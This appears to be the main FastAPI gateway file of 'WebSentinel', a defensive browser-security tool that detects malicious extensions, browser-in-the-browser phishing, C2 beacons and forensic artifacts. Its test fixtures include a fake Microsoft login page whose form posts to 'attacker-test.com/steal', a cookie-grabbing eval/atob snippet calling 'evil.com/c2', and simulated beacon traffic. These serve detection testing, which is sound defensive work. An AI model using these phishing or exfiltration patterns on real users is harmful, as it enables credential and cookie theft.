"""
WebSentinel — FastAPI API Gateway (All Components)
Integrates C1 (Extension Analyzer), C2 (BitB Phishing), C3 (Beacon Detector), C4 (Forensics)
Launch from project root: python -m uvicorn core.main:app --port 8000
"""
# ── Windows: switch to ProactorEventLoop so Playwright can spawn Chromium ──
import sys, os, asyncio
if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

import json, tempfile, subprocess, time as _time, re as _re
from datetime import datetime
from typing import List, Optional, Set

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

from fastapi import FastAPI, File, HTTPException, Response, UploadFile, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, StreamingResponse
from pydantic import BaseModel

# ── C1 — Malicious Browser Extension Analyzer ─────────────────────────────────
from .c1.analyzer  import analyze_extension as analyze_extension_c1
from .c1.analyzer  import sandbox_extension as sandbox_extension_c1
from .c1.db        import save_result as c1_db_save, get_history as c1_db_history
from .c1.crx_utils import (
    extract_ext_id_from_url, is_webstore_url,
    fetch_crx_from_store, parse_crx_bytes, parse_crx_file,
    extract_crx_to_persistent_dir,
)

# ── C2 — Browser-in-the-Browser Phishing Detector ─────────────────────────────
from .c2.layer1_bitb       import check_bitb
from .c2.layer2_url        import check_url
from .c2.layer3_visual     import check_visual
from .c2.layer4_form       import check_form
from .c2.layer5_reputation import check_reputation

# ── C3 — Browser Execution-Aware C2 Beacon Detector ───────────────────────────
from .c3.context_tagger import c3_tagger
from .c3.interceptor    import c3_interceptor
from .c3.analyzer       import c3_analyzer
from .c3.alert_store    import c3_alert_store

# ── C4 — Browser Artifact Forensic Correlation Engine ─────────────────────────
from .c4 import (
    get_default_profile_path,
    get_last_result,
    get_summary as get_c4_summary,
    render_last_html,
    render_last_json,
    render_last_siem,
    report_filename,
    run_forensic_analysis,
)

# ── Shared Playwright session ──────────────────────────────────────────────────
from .playwright_session import pw_session, PROFILE_DIR as PW_PROFILE_DIR

# ══════════════════════════════════════════════════════════════════════════════
from contextlib import asynccontextmanager

@asynccontextmanager
async def lifespan(app):
    # Auto-start the Playwright browser when the server boots
    global _session_starting
    _session_starting = True
    pw_session.clear_callbacks()
    pw_session.add_nav_callback(_pw_nav_handler)
    pw_session.add_click_callback(_on_extension_install_click)
    asyncio.create_task(_bg_start_session())
    yield
    # Graceful shutdown
    await c3_analyzer.stop_loop()
    await c3_interceptor.stop()
    await pw_session.stop()

app = FastAPI(title="WebSentinel API", version="4.0.0", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── WebSocket broadcast set ────────────────────────────────────────────────────
_ws_clients: Set[WebSocket] = set()
_session_starting = False

async def _broadcast(data: dict) -> None:
    dead: Set[WebSocket] = set()
    for ws in list(_ws_clients):
        try:
            await ws.send_json(data)
        except Exception:
            dead.add(ws)
    _ws_clients.difference_update(dead)

# ── Analyzing page shown in the Playwright browser while C1 scans an extension ─
_ANALYZING_HTML = """\
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>WebSentinel — Analyzing Extension</title>
<style>
  *{{margin:0;padding:0;box-sizing:border-box}}
  body{{background:#0a0e1a;color:#e2e8f0;font-family:system-ui,sans-serif;
       display:flex;align-items:center;justify-content:center;min-height:100vh}}
  .card{{text-align:center;max-width:440px;padding:48px 40px;
        background:#131929;border:1px solid #1e2d45;border-radius:16px}}
  .spinner{{width:56px;height:56px;border:4px solid #1e2d45;
           border-top-color:#3b82f6;border-radius:50%;
           animation:spin .9s linear infinite;margin:0 auto 28px}}
  @keyframes spin{{to{{transform:rotate(360deg)}}}}
  h1{{font-size:18px;font-weight:700;color:#f1f5f9;margin-bottom:10px}}
  .ext{{font-size:11px;font-family:monospace;color:#64748b;
       background:#0a0e1a;padding:4px 10px;border-radius:6px;
       display:inline-block;margin-bottom:20px}}
  p{{font-size:13px;color:#94a3b8;line-height:1.6}}
  .badge{{margin-top:28px;font-size:11px;color:#3b82f6;letter-spacing:.05em}}
</style>
</head>
<body>
<div class="card">
  <div class="spinner"></div>
  <h1>Analyzing Extension</h1>
  <div class="ext">{ext_id}</div>
  <p>WebSentinel is scanning this extension for malicious behavior.<br>
     Check the <strong>WebSentinel dashboard → C1</strong> panel for results.</p>
  <div class="badge">WEBSENTINEL &middot; C1 EXTENSION ANALYZER</div>
</div>
</body>
</html>"""

# ── In-memory state ────────────────────────────────────────────────────────────
alerts: list = []
c1_history: list = []
_pending_installs: dict = {}

_SETTINGS_FILE = os.path.join(os.path.dirname(__file__), "settings.json")

_SETTINGS_DEFAULTS: dict = {
    "layers": {"l1": True, "l2": True, "l3": True, "l4": True, "l5": True},
    "whitelist": [],
    "gsb_key": "",
    "pw_home_url": "",
}

def _load_settings() -> dict:
    try:
        with open(_SETTINGS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        merged = dict(_SETTINGS_DEFAULTS)
        merged.update(data)
        return merged
    except (FileNotFoundError, json.JSONDecodeError):
        return dict(_SETTINGS_DEFAULTS)

def _save_settings(s: dict) -> None:
    try:
        with open(_SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(s, f, indent=2)
    except Exception:
        pass

settings: dict = _load_settings()

# ── Request / response models ──────────────────────────────────────────────────
class AnalyzeReq(BaseModel):
    url: str
    dom: Optional[str] = None
    screenshot: Optional[str] = None

class SettingsReq(BaseModel):
    layers: dict
    whitelist: List[str] = []
    gsb_key: str = ""
    pw_home_url: str = ""

class ExtensionAnalyzeReq(BaseModel):
    manifest: str
    source_code: Optional[str] = ""
    extension_id: Optional[str] = ""
    extension_path: Optional[str] = ""

class SandboxReq(BaseModel):
    extension_path: str

class InstallExtensionReq(BaseModel):
    url_or_id: str
    force: bool = False

class WebstoreLookupReq(BaseModel):
    url_or_id: str

class ApproveInstallReq(BaseModel):
    ext_id: str

class C3CollectReq(BaseModel):
    label: int

class ForensicReq(BaseModel):
    profile_path: Optional[str] = None
    save_outputs: bool = True

class NavigateReq(BaseModel):
    url: str


# ══════════════════════════════════════════════════════════════════════════════
#  Core / shared endpoints
# ══════════════════════════════════════════════════════════════════════════════

@app.get("/health")
async def health():
    return {"status": "ok", "timestamp": datetime.now().isoformat(), "alerts": len(alerts)}


# ══════════════════════════════════════════════════════════════════════════════
#  C2 — BitB Phishing Detection
# ══════════════════════════════════════════════════════════════════════════════

@app.post("/analyze")
async def analyze(req: AnalyzeReq):
    url = req.url
    for prefix in ("about:", "chrome:", "devtools:", "electron:"):
        if url.startswith(prefix):
            return {"url": url, "verdict": "SKIP", "risk_score": 0,
                    "layers": [], "timestamp": datetime.now().isoformat()}

    for domain in settings["whitelist"]:
        if domain and domain.lower() in url.lower():
            return {"url": url, "verdict": "WHITELISTED", "risk_score": 0,
                    "layers": [], "timestamp": datetime.now().isoformat()}

    ly = settings["layers"]
    layer_results = []
    weights = {"L1": 0.15, "L2": 0.30, "L3": 0.20, "L4": 0.15, "L5": 0.20}

    layer_jobs = []
    if ly.get("l1", True): layer_jobs.append(("L1", "BitB Detection",    check_bitb(url, req.dom or "")))
    if ly.get("l2", True): layer_jobs.append(("L2", "URL Analysis",      check_url(url)))
    if ly.get("l3", True): layer_jobs.append(("L3", "Visual Similarity", check_visual(url, req.screenshot or "")))
    if ly.get("l4", True): layer_jobs.append(("L4", "Form Destination",  check_form(url, req.dom or "")))
    if ly.get("l5", True): layer_jobs.append(("L5", "Reputation Check",  check_reputation(url, settings["gsb_key"])))

    for lid, lname, coro in layer_jobs:
        try:
            res = await coro
            layer_results.append({"id": lid, "name": lname,
                                   "score": round(float(res["score"]), 4),
                                   "detail": res.get("detail", "")})
        except Exception as e:
            layer_results.append({"id": lid, "name": lname, "score": 0.0, "detail": f"Error: {e}"})

    risk_score = sum(lr["score"] * weights.get(lr["id"], 0.2) * 100 for lr in layer_results)
    risk_score = round(min(100.0, max(0.0, risk_score)), 1)
    verdict = "PHISHING" if risk_score >= 60 else "SUSPICIOUS" if risk_score >= 30 else "SAFE"

    result = {"url": url, "verdict": verdict, "risk_score": risk_score,
              "layers": layer_results, "timestamp": datetime.now().isoformat()}
    alerts.insert(0, result)
    if len(alerts) > 500:
        alerts.pop()
    return result


@app.get("/alerts")
async def get_alerts(limit: int = 50):
    return alerts[:limit]


@app.post("/settings")
async def save_settings(req: SettingsReq):
    settings.update({"layers": req.layers, "whitelist": req.whitelist,
                      "gsb_key": req.gsb_key, "pw_home_url": req.pw_home_url})
    _save_settings(settings)
    return {"status": "saved"}


@app.get("/settings")
async def get_settings():
    return settings


# ══════════════════════════════════════════════════════════════════════════════
#  C1 — Malicious Browser Extension Analyzer
# ══════════════════════════════════════════════════════════════════════════════

def _store_c1_result(result: dict, source: str, webstore_url: str = "") -> dict:
    result["timestamp"]    = datetime.now().isoformat()
    result["source"]       = source
    result["webstore_url"] = webstore_url
    c1_history.insert(0, result)
    if len(c1_history) > 50:
        c1_history.pop()
    try:
        c1_db_save(result)
    except Exception as exc:
        print(f"[C1-DB] Save failed (non-fatal): {exc}")
    return result


@app.post("/extension/analyze")
async def extension_analyze(req: ExtensionAnalyzeReq):
    result = await analyze_extension_c1(
        req.manifest, req.source_code or "",
        req.extension_id or "", req.extension_path or "",
    )
    return _store_c1_result(result, "manual")


@app.post("/extension/upload")
async def extension_upload(file: UploadFile = File(...)):
    if not file.filename or not file.filename.lower().endswith(".crx"):
        raise HTTPException(status_code=400, detail="Only .crx files are accepted.")
    crx_data = await file.read()
    if len(crx_data) < 16:
        raise HTTPException(status_code=400, detail="File too small to be a valid CRX.")
    try:
        manifest_dict, source_code, ext_id = parse_crx_bytes(crx_data)
    except Exception as exc:
        raise HTTPException(status_code=422, detail=f"Could not parse CRX: {exc}")

    manifest_str = json.dumps(manifest_dict)
    ext_path = ""
    try:
        import io, zipfile
        from .c1.crx_utils import _crx_to_zip_bytes
        zip_bytes = _crx_to_zip_bytes(crx_data)
        tmp_dir = tempfile.mkdtemp(prefix="c1_upload_")
        with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
            zf.extractall(tmp_dir)
        ext_path = tmp_dir
    except Exception:
        pass

    result = await analyze_extension_c1(manifest_str, source_code, ext_id, ext_path)
    result["filename"] = file.filename
    return _store_c1_result(result, "upload")


@app.post("/extension/webstore")
async def extension_webstore(req: WebstoreLookupReq):
    raw = req.url_or_id.strip()
    ext_id = extract_ext_id_from_url(raw) or (raw.lower() if len(raw) == 32 else None)
    if not ext_id:
        raise HTTPException(status_code=400,
            detail="Provide a Chrome Web Store URL or a 32-character extension ID.")
    webstore_url = raw if is_webstore_url(raw) else \
        f"https://chromewebstore.google.com/detail/{ext_id}"
    try:
        crx_data = await fetch_crx_from_store(ext_id)
    except Exception as exc:
        raise HTTPException(status_code=502,
            detail=f"Could not download extension from Chrome Web Store: {exc}")
    try:
        manifest_dict, source_code, _ = parse_crx_bytes(crx_data, ext_id)
    except Exception as exc:
        raise HTTPException(status_code=422, detail=f"Could not parse downloaded CRX: {exc}")
    ext_path = ""
    try:
        ext_path = extract_crx_to_persistent_dir(crx_data, ext_id)
    except Exception:
        pass
    result = await analyze_extension_c1(json.dumps(manifest_dict), source_code, ext_id, ext_path)
    result["webstore_url"] = webstore_url
    return _store_c1_result(result, "webstore", webstore_url)


@app.post("/extension/sandbox")
async def extension_sandbox(req: SandboxReq):
    return await sandbox_extension_c1(req.extension_path)


@app.get("/extension/history")
async def extension_history(limit: int = 20):
    try:
        return await asyncio.to_thread(c1_db_history, limit)
    except Exception:
        return c1_history[:limit]


@app.post("/session/install_extension")
async def session_install_extension(req: InstallExtensionReq):
    raw = req.url_or_id.strip()
    ext_id = extract_ext_id_from_url(raw) or (raw.lower() if len(raw) == 32 else None)
    if not ext_id:
        raise HTTPException(status_code=400,
            detail="Provide a Chrome Web Store URL or a 32-character extension ID.")
    try:
        crx_data = await fetch_crx_from_store(ext_id)
    except Exception as exc:
        raise HTTPException(status_code=502,
            detail=f"Could not download from Chrome Web Store: {exc}")
    try:
        manifest_dict, source_code, _ = parse_crx_bytes(crx_data, ext_id)
    except Exception as exc:
        raise HTTPException(status_code=422, detail=f"Could not parse CRX: {exc}")

    c1_result = await analyze_extension_c1(json.dumps(manifest_dict), source_code, ext_id)
    _store_c1_result(c1_result, "webstore_install")

    if c1_result["verdict"] == "MALICIOUS" and not req.force:
        return {"status": "blocked",
                "reason": "C1 flagged this extension as MALICIOUS — installation prevented.",
                "extension_id": ext_id, "c1_result": c1_result}

    try:
        ext_path = extract_crx_to_persistent_dir(crx_data, ext_id)
    except Exception as exc:
        raise HTTPException(status_code=500, detail=f"Extraction failed: {exc}")

    if pw_session.is_running:
        pw_session.register_extension(ext_path)
        await _broadcast({"type": "c1_extension_installed",
                           "extension_id": ext_id,
                           "extension_path": ext_path,
                           "c1_result": c1_result})
        return {"status": "installed", "extension_id": ext_id,
                "extension_path": ext_path, "c1_result": c1_result,
                "note": "Extension registered — will be active on next session start."}
    return {"status": "ready",
            "message": "Extension extracted. Start the browser session to load it.",
            "extension_id": ext_id, "extension_path": ext_path, "c1_result": c1_result}


@app.get("/session/extensions")
async def get_session_extensions():
    return {"extensions": pw_session.loaded_extensions,
            "count": len(pw_session.loaded_extensions)}


async def _on_extension_install_click(ext_id: str, webstore_url: str) -> None:
    if not ext_id:
        return
    print(f"[C1] 'Add to Chrome' clicked: {ext_id}")
    await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                      "url": webstore_url, "state": "analyzing"})
    try:
        crx_data = await fetch_crx_from_store(ext_id)
        manifest_dict, source_code, _ = parse_crx_bytes(crx_data, ext_id)
        ext_path = extract_crx_to_persistent_dir(crx_data, ext_id)
        manifest_str = json.dumps(manifest_dict)

        static_result = await analyze_extension_c1(manifest_str, source_code, ext_id)
        static_score_pct = static_result["static"]["score"] * 100

        if static_score_pct >= 50.0:
            await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                               "url": webstore_url, "state": "sandbox_running",
                               "static_score": round(static_score_pct, 1)})
            c1_result = await analyze_extension_c1(manifest_str, source_code, ext_id,
                                                    extension_path=ext_path)
        else:
            c1_result = static_result

        _store_c1_result(c1_result, "webstore_intercept", webstore_url)
        _pending_installs[ext_id] = {"c1_result": c1_result, "ext_path": ext_path,
                                      "webstore_url": webstore_url}

        state = {"SAFE": "safe", "SUSPICIOUS": "suspicious",
                 "MALICIOUS": "malicious"}.get(c1_result["verdict"], "suspicious")
        print(f"[C1] {ext_id} -> {c1_result['verdict']} (score={c1_result['score']:.3f})")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": state, "result": c1_result})
    except Exception as exc:
        print(f"[C1] Analysis FAILED for {ext_id}: {exc}")
        await _broadcast({"type": "c1_install_intercepted", "ext_id": ext_id,
                           "url": webstore_url, "state": "error", "error": str(exc)})


@app.post("/session/approve_install")
async def approve_install(req: ApproveInstallReq):
    pending = _pending_installs.get(req.ext_id)
    if not pending:
        raise HTTPException(status_code=404,
            detail="No pending install found for this extension ID.")
    verdict = pending["c1_result"].get("verdict", "SUSPICIOUS")
    if verdict != "SAFE":
        raise HTTPException(status_code=403,
            detail=f"Cannot approve — extension verdict is {verdict}.")
    ext_path     = pending["ext_path"]
    webstore_url = pending.get("webstore_url", "")
    del _pending_installs[req.ext_id]
    # Register the extension in the launch list without restarting the session.
    # Chrome requires --load-extension at startup; hot-loading is not supported
    # by this Chromium build. The extension will be active on the next session start.
    pw_session.register_extension(ext_path)
    await _broadcast({"type": "c1_install_approved", "ext_id": req.ext_id,
                       "extension_path": ext_path, "webstore_url": webstore_url})
    return {"status": "approved", "ext_id": req.ext_id,
            "note": "Extension registered — will be active on next session start."}


@app.post("/session/block_install")
async def block_install(req: ApproveInstallReq):
    _pending_installs.pop(req.ext_id, None)
    await _broadcast({"type": "c1_install_blocked", "ext_id": req.ext_id})
    return {"status": "blocked", "ext_id": req.ext_id}


def _run_test_component(label: str, script: str) -> dict:
    """Run a test script as a subprocess and parse unittest -v output."""
    start = _time.time()
    try:
        proc = subprocess.run(
            [sys.executable, script, "-v"],
            capture_output=True, text=True, timeout=120,
            cwd=_REPO_ROOT, encoding="utf-8", errors="replace"
        )
        output = proc.stderr + "\n" + proc.stdout  # unittest writes to stderr
        elapsed = _time.time() - start

        tests = []
        # unittest -v format: "test_name (module.ClassName) ... ok"
        # Python 3.11+ adds the test method in the class name too
        for line in output.splitlines():
            m = _re.match(r"^(test\w+)\s+\(([^)]+)\)\s+\.\.\.\s+(ok|FAIL|ERROR|skipped.*)", line)
            if m:
                tname, tclass, tstatus = m.group(1), m.group(2).split(".")[-1], m.group(3)
                tests.append({"name": tname, "cls": tclass,
                               "status": "pass" if tstatus == "ok" else "skip" if tstatus.startswith("skipped") else "fail"})
            else:
                # C4 script format: "  PASS  description" or "  FAIL  description"
                m2 = _re.match(r"^\s+(PASS|FAIL)\s+(.+)", line)
                if m2:
                    tests.append({"name": m2.group(2).strip()[:80], "cls": "",
                                   "status": "pass" if m2.group(1) == "PASS" else "fail"})

        # Extract failure/error detail blocks
        fail_blocks: dict = {}
        current_key = None
        for line in output.splitlines():
            if line.startswith("FAIL: ") or line.startswith("ERROR: "):
                current_key = line.split(": ", 1)[1].split(" ")[0]
                fail_blocks[current_key] = []
            elif current_key and line.startswith("-" * 10):
                continue
            elif current_key:
                if line.startswith("=" * 10):
                    current_key = None
                else:
                    fail_blocks[current_key].append(line)

        # Attach error messages to tests
        for t in tests:
            if t["status"] == "fail":
                key = t["name"]
                if key in fail_blocks:
                    t["message"] = "\n".join(fail_blocks[key]).strip()

        passed = sum(1 for t in tests if t["status"] == "pass")
        failed = sum(1 for t in tests if t["status"] == "fail")

        # Fallback: if no tests parsed, check return code
        if not tests:
            # Try to parse summary line: "Ran X tests in Y.Ys"
            m_ran = _re.search(r"Ran (\d+) test", output)
            total = int(m_ran.group(1)) if m_ran else 0
            ok_m = _re.search(r"OK", output)
            passed = total if ok_m else 0
            failed = total - passed

        return {
            "label": label,
            "passed": passed,
            "failed": failed,
            "total": len(tests) if tests else (passed + failed),
            "duration": round(elapsed, 2),
            "tests": tests,
            "stdout": output[-3000:],  # last 3000 chars for debugging
            "returncode": proc.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"label": label, "passed": 0, "failed": 0, "total": 0,
                "duration": 120, "tests": [], "stdout": "Timeout after 120s", "returncode": -1}
    except Exception as exc:
        return {"label": label, "passed": 0, "failed": 0, "total": 0,
                "duration": 0, "tests": [], "stdout": str(exc), "returncode": -1}


@app.post("/dev/run_tests")
async def run_tests(component: str = "all"):
    """Run unit test suites and return structured results."""
    components_map = {
        "c1": ("C1 — Extension Analyzer",   os.path.join(_REPO_ROOT, "test", "C1", "test_c1_units.py")),
        "c2": ("C2 — Phishing Detection",   os.path.join(_REPO_ROOT, "test", "C2", "test_c2_layers.py")),
        "c3": ("C3 — Beacon Detector",      os.path.join(_REPO_ROOT, "test", "C3", "test_c3_units.py")),
        "c4": ("C4 — Forensic Correlation", os.path.join(_REPO_ROOT, "test", "C4", "test_correlation.py")),
    }
    targets = list(components_map.items()) if component == "all" else \
              [(component, components_map[component])] if component in components_map else []

    loop = asyncio.get_event_loop()
    results = []
    for cid, (label, script) in targets:
        r = await loop.run_in_executor(None, _run_test_component, label, script)
        r["id"] = cid
        results.append(r)

    total_passed = sum(r["passed"] for r in results)
    total_failed = sum(r["failed"] for r in results)
    total_duration = sum(r["duration"] for r in results)
    return {
        "components": results,
        "total_passed": total_passed,
        "total_failed": total_failed,
        "total_duration": round(total_duration, 2),
    }


_TEST_PAGES: dict = {
    "c2-phish": """<!DOCTYPE html><html><head><title>Secure Login - Microsoft</title></head><body>
<iframe style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;border:none;"
        src="https://login.evil-test.com/oauth"></iframe>
<form action="https://attacker-test.com/steal" method="POST">
  <input type="password" name="pass" placeholder="Password"/>
  <input type="hidden" name="token" value="abc123"/>
</form>
<script src="https://cdn.evil-test.com/tracker.js"></script>
<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
            background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 32px rgba(0,0,0,.3);
            font-family:Segoe UI,sans-serif;text-align:center;z-index:99998">
  <h2 style="color:#0078d4">Sign in to Microsoft</h2>
  <input type="email" placeholder="Email" style="display:block;width:280px;padding:8px;margin:12px auto;border:1px solid #ccc;border-radius:4px"/>
  <input type="password" placeholder="Password" style="display:block;width:280px;padding:8px;margin:12px auto;border:1px solid #ccc;border-radius:4px"/>
  <button style="background:#0078d4;color:#fff;border:none;padding:10px 24px;border-radius:4px;cursor:pointer">Next</button>
  <p style="font-size:11px;color:#888;margin-top:12px">WebSentinel C2 Phishing Test Page</p>
</div>
</body></html>""",

    "c2-clean": """<!DOCTYPE html><html><head><title>My Blog</title></head><body>
<h1>Welcome to My Blog</h1><p>This is a perfectly safe page with no phishing indicators.</p>
<article><h2>Article Title</h2><p>Some content here.</p></article>
<footer><p>Copyright 2024 My Blog</p></footer>
</body></html>""",

    "c3-beacon": """<!DOCTYPE html><html><head><title>Beacon Test</title></head><body>
<h2>C3 Beacon Simulation Test</h2>
<p>This page simulates C2 beacon behavior for testing purposes.</p>
<script>
// Simulate regular beacon requests (for test visualization only)
let seq = 0;
function sendBeacon() {
  console.log('[C3-TEST] Beacon seq=' + seq++);
}
setInterval(sendBeacon, 5000);
</script>
</body></html>""",
}

@app.get("/dev/test-page/{name}")
async def serve_test_page(name: str):
    html = _TEST_PAGES.get(name)
    if not html:
        return HTMLResponse("<html><body>Test page not found</body></html>", status_code=404)
    return HTMLResponse(html)


# ── Inline test cases ─────────────────────────────────────────────────────────

async def _tc_c1_benign_manifest():
    from .c1.features import extract_manifest_features
    manifest = {"name": "Simple", "version": "1.0", "manifest_version": 3, "permissions": ["storage"]}
    feats = extract_manifest_features(manifest, "")
    assert feats["has_webRequest"] == 0.0, "has_webRequest should be 0"
    assert feats["has_all_urls"] == 0.0, "has_all_urls should be 0"
    assert feats["total_permission_count"] == 1.0, "total_permission_count should be 1"
    return {"detail": "storage-only manifest → all high-risk features = 0"}

async def _tc_c1_malicious_manifest():
    from .c1.features import extract_manifest_features
    manifest = {
        "name": "Evil", "version": "1.0", "manifest_version": 3,
        "permissions": ["webRequest", "cookies", "tabs", "nativeMessaging"],
        "host_permissions": ["<all_urls>"],
        "background": {"service_worker": "bg.js"},
        "content_scripts": [{"matches": ["<all_urls>"], "js": ["inject.js"]}],
    }
    feats = extract_manifest_features(manifest, "")
    assert feats["has_webRequest"] == 1.0
    assert feats["has_all_urls"] == 1.0
    assert feats["has_nativeMessaging"] == 1.0
    assert feats["has_background_script"] == 1.0
    return {"detail": f"malicious manifest → 4 high-risk flags confirmed"}

async def _tc_c1_code_eval_detection():
    from .c1.features import extract_manifest_features
    manifest = {"name": "T", "version": "1", "manifest_version": 3, "permissions": []}
    code = "eval(atob('aGVsbG8=')); document.cookie; fetch('https://evil.com/c2');"
    feats = extract_manifest_features(manifest, code)
    assert feats["eval_count"] > 0, "eval not detected"
    assert feats["atob_count"] > 0, "atob not detected"
    assert feats["cookie_in_code"] > 0, "cookie access not detected"
    assert feats["xhr_fetch_count"] > 0, "fetch not detected"
    return {"detail": f"eval={feats['eval_count']}, atob={feats['atob_count']}, cookie={feats['cookie_in_code']}, fetch={feats['xhr_fetch_count']}"}

async def _tc_c1_entropy():
    from .c1.features import _shannon_entropy
    clean = _shannon_entropy("console.log('hello world');")
    obf = _shannon_entropy("var _0x1a=['\\x68\\x65\\x6c\\x6c\\x6f'];eval(atob('aGVsbG8='));_0x1a[0x0];")
    assert clean >= 0.0
    assert obf > 0.0
    return {"detail": f"clean={clean:.2f} bits, obfuscated={obf:.2f} bits"}

async def _tc_c2_url_phishing():
    score_data = await check_url("http://paypal-secure-login.yolasite.com/update")
    assert score_data["score"] > 0.0, f"Phishing URL scored 0: {score_data}"
    return {"detail": f"paypal-secure-login.yolasite.com → score={score_data['score']:.3f}"}

async def _tc_c2_url_benign():
    score_data = await check_url("https://www.google.com/search?q=python")
    assert score_data["score"] < 0.8, f"Benign URL scored too high: {score_data['score']}"
    return {"detail": f"google.com → score={score_data['score']:.3f} (below 0.80 threshold)"}

async def _tc_c2_form_offsite():
    dom = """<html><body><form action="https://attacker.com/steal" method="POST">
    <input type="password" name="pass"/></form></body></html>"""
    res = await check_form("https://legitimate-bank.com/login", dom)
    assert res["score"] > 0.5, f"Off-domain form scored {res['score']}"
    return {"detail": f"form→attacker.com from legitimate-bank.com → score={res['score']:.2f}"}

async def _tc_c2_form_samedomain():
    dom = """<html><body><form action="/submit" method="POST">
    <input type="password" name="pass"/></form></body></html>"""
    res = await check_form("https://mybank.com/login", dom)
    assert res["score"] == 0.0, f"Same-domain form scored {res['score']} (expected 0)"
    return {"detail": f"form→/submit from mybank.com → score=0.00 (safe)"}

async def _tc_c2_browser_phish():
    """Navigate Playwright browser to phishing test page and analyze live."""
    test_url = "http://127.0.0.1:8765/dev/test-page/c2-phish"
    phish_html = _TEST_PAGES["c2-phish"]
    # Navigate browser to the test page (visual demonstration)
    if pw_session.is_running():
        try:
            await pw_session.navigate(test_url)
        except Exception:
            pass
    # Run C2 analysis on the phishing HTML directly
    res = await check_bitb(test_url, phish_html)
    assert res["score"] > 0.3, f"Phishing page scored too low: {res['score']}"
    url_res = await check_url(test_url)
    form_res = await check_form(test_url, phish_html)
    rep_res  = await check_reputation(test_url, settings.get("gsb_key", ""))
    combined = round(min(1.0, res["score"] * 0.35 + url_res["score"] * 0.30 + form_res["score"] * 0.20 + rep_res["score"] * 0.15), 3)
    return {
        "detail": f"BitB={res['score']:.2f} URL={url_res['score']:.2f} Form={form_res['score']:.2f} → combined={combined:.2f}",
        "browser_url": test_url,
    }

async def _tc_c2_browser_clean():
    """Navigate Playwright browser to clean test page and verify low score."""
    test_url = "http://127.0.0.1:8765/dev/test-page/c2-clean"
    clean_html = _TEST_PAGES["c2-clean"]
    if pw_session.is_running():
        try:
            await pw_session.navigate(test_url)
        except Exception:
            pass
    res = await check_bitb(test_url, clean_html)
    assert res["score"] < 0.8, f"Clean page scored too high: {res['score']}"
    return {
        "detail": f"Clean blog page → BitB score={res['score']:.2f} (below 0.80 threshold)",
        "browser_url": test_url,
    }

async def _tc_c3_beacon_iat():
    from .c3.feature_engine import compute_features
    import time as _t
    now = _t.time()
    events = [{"timestamp": now + i * 5.0, "url": "http://c2.evil/beacon",
               "method": "GET", "size_bytes": 256, "idle_time_ms": 4800,
               "user_was_active": False, "is_background_tab": True, "is_extension_origin": False}
              for i in range(20)]
    feats = compute_features(events)
    assert feats["iat_cv"] < 0.10, f"Beacon IAT CV too high: {feats['iat_cv']}"
    assert feats["background_tab_ratio"] == 1.0
    return {"detail": f"20 regular beacons @5s → IAT-CV={feats['iat_cv']:.4f} BG-ratio={feats['background_tab_ratio']:.2f}"}

async def _tc_c3_human_iat():
    from .c3.feature_engine import compute_features
    import time as _t
    now = _t.time()
    urls = ["https://github.com", "https://google.com", "https://stackoverflow.com",
            "https://wikipedia.org", "https://news.ycombinator.com"]
    events = [{"timestamp": now + sum(range(i + 1)) * (3 + i % 7),
               "url": urls[i % len(urls)], "method": "GET", "size_bytes": 50000 + i * 1200,
               "idle_time_ms": 100, "user_was_active": True, "is_background_tab": False,
               "is_extension_origin": False}
              for i in range(15)]
    feats = compute_features(events)
    assert feats["iat_cv"] > 0.10, f"Human browsing IAT CV too low: {feats['iat_cv']}"
    assert feats["user_active_ratio"] == 1.0
    return {"detail": f"15 human browsing events → IAT-CV={feats['iat_cv']:.4f} (irregular, >0.10)"}

async def _tc_c3_fusion_beacon():
    from .c3.risk_fusion import C3RiskFusion
    fusion = C3RiskFusion()
    result = fusion.fuse(anomaly=0.8, reputation=0.9, heuristic=0.7)
    assert result["verdict"] == "BEACON", f"Expected BEACON, got {result['verdict']}"
    assert result["score"] >= 0.6
    return {"detail": f"anomaly=0.8 rep=0.9 heuristic=0.7 → verdict={result['verdict']} score={result['score']:.2f}"}

async def _tc_c3_fusion_safe():
    from .c3.risk_fusion import C3RiskFusion
    fusion = C3RiskFusion()
    result = fusion.fuse(anomaly=0.0, reputation=0.0, heuristic=0.0)
    assert result["verdict"] == "SAFE", f"Expected SAFE, got {result['verdict']}"
    return {"detail": f"all signals=0 → verdict={result['verdict']} score={result['score']:.2f}"}

async def _tc_c4_cooccurrence():
    from .c4.rules import apply_single_artifact_rules
    from .c4.correlation import run_correlation
    from datetime import datetime, timedelta
    t0 = datetime(2024, 3, 15, 14, 0, 0)
    def ev(ts, atype, detail, risk=False):
        return {"timestamp": ts.isoformat(), "artifact_type": atype, "source_file": "test",
                "detail": detail, "risk_flag": risk, "risk_reasons": [], "anomaly_score": 0,
                "anomaly_reasons": [], "rule_flags": []}
    events = [
        ev(t0, "history", {"url": "https://evil-c4-test.com/login"}, risk=True),
        ev(t0 + timedelta(seconds=30), "cookie", {"host": ".evil-c4-test.com", "name": "session", "path": "/", "secure": True, "httponly": True}, risk=True),
        ev(t0 + timedelta(seconds=90), "credential", {"origin": "https://evil-c4-test.com", "username": "victim", "times_used": 0, "password": "[ENCRYPTED]"}, risk=True),
    ]
    events = apply_single_artifact_rules(events)
    corr = run_correlation(events)
    cooc = corr["cooccurrence"]
    assert any("evil-c4-test.com" in str(f.get("domain","")) for f in cooc), "Co-occurrence not detected"
    return {"detail": f"history+cookie+credential on evil-c4-test.com → {len(cooc)} co-occurrence cluster(s)"}

async def _tc_c4_attack_chain():
    from .c4.rules import apply_single_artifact_rules
    from .c4.correlation import run_correlation
    from datetime import datetime, timedelta
